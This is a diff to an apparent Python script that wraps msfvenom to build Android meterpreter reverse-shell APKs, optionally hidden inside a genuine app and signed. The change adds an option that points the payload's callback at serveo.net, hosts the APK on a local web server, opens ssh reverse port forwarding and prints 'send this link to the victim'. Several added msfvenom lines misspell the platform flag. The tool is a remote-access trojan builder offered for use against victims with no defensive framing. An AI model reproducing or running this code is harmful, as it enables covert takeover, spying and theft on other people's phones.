@@ -18,6 +18,7 @@ os.system('echo -e "\033[1m \e[32m programmed by FEBIN"')
 print("""[1]android/meterpreter/reverse_tcp
 [2]android/meterpreter/reverse_http
 [3]android/meterpreter/reverse_https
+[4]Android payload works over internet(port forwarding using ssh)
 
 """)
 payload=int(input("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE : "))
@@ -31,7 +32,7 @@ def venom():
         if bind=="Y" or bind=="Y":
             realapp=input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -39,7 +40,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         elif bind=="n" or bind=="N":
-            os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_tcp -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
@@ -52,7 +53,7 @@ def venom():
         if bind == "Y" or bind == "Y":
             realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http -a dalvik --patform=android lhost={lhost}  lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -60,7 +61,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         elif bind == "n" or bind == "N":
-            os.system(f"msfvenom -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_http -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
@@ -73,7 +74,7 @@ def venom():
         if bind == "Y" or bind == "Y":
             realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
             if os.path.exists(realapp):
-                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name} ")
+                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name} ")
                 print("SIGNING YOUR APK>>>>>>")
                 os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                 print("D--O--N--E...........!!!!!!")
@@ -81,7 +82,7 @@ def venom():
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
         elif bind == "n" or bind == "N":
-            os.system(f"msfvenom -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_https -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
@@ -89,7 +90,44 @@ def venom():
         else:
             print("INVALID INPUT>>>>>>!!!!!")
             print("exiting.......please rerun the tool")
-
+    elif payload==4:
+        	malware="android/meterpreter/reverse_tcp"
+	        ip=socket.gethostbyname(socket.gethostname())
+	        port=input("ENTER THE PORT TO FORWARD OVER WAN : ")
+	        path=input("enter the path to save your payload : ")	
+	        serv=socket.gethostbyname("serveo.net")
+	        name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
+	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
+	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {path}/{name}.apk")
+	        print("SIGNING YOUR APK>>>>>>...")
+	        print("")
+	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {path}/{name}.apk")
+	        print("")
+	        print(f"{path}/{name}.apk  has been created successfully .......")
+	        link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK? (kali linux only) [Y/n] : ")
+	        if link=="y" or link=="Y":
+		             print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
+		             print("")
+		             print("[1] custom domain   [2] default domain")
+		             domain=int(input("ENTER YOUR CHOICE : "))
+		             if domain==1:
+			               dn=input("Enter a name for subdomain :")
+			               print("SERVER AND PORT FORWARDING STARTED ctrl+c to STOP")
+			               os.system(f"cp {path}/{name}.apk /var/www/html/")
+			               os.system("service apache2 start") 
+			               print(f"send this link to the victim >>> {dn}.serveo.net/{name}.apk")
+			               os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
+		             else:
+			                print(f"using DEFAULT url > https://febrev.serveo.net/{name}.apk <<send this link to victim")
+			                os.system(f"cp {path}/{name}.apk /var/www/html/")
+			                os.system("service apache2 start") 
+			                print("SERVER AND PORT FORWARDING ENABLED.....")
+			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
+	        else:
+		           print("PORT FORWARDING ENABLED>>>>>>>>>>")
+		           print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
+		           os.system(f"ssh -R {port}:{ip}:{port} serveo.net")
+    
     else:
         print("PLEASE SELECT A PAYLOAD.............!!!")
         print("exiting......")
